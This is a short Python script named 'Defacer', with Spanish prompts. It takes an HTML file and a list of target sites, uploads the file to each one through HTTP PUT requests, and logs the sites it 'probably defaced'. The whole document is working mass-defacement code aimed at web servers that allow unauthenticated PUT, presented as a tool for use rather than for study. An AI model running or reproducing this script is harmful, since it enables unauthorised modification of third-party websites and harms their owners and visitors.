# -*- coding: utf-8 -*-
import requests
import os.path
import sys

RED = '\033[1;31m'
GREEN = '\033[1;32m'
WHITE = '\033[1;00m'

banner = RED + "Defacer"

def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)

    return str(ipt)


def aox(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(WHITE + "$" + RED + " No se pudo defacear" + WHITE + " : %s/%s" % (site, script))
                else:
                    print(WHITE + "$" + GREEN + " Probablemente se pudo defacear" + WHITE + " : %s/%s" % (site, script))
                    a = open("defaceadas.txt", "a")
                    a.write(site+"/"+script+"\n")
                    a.close()

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()


def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x("Tu codigo html: ")
            if not os.path.isfile(a):
                print("archivo '%s' no encontrado" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()

    aox(a)


if __name__ == "__main__":
    main(banner)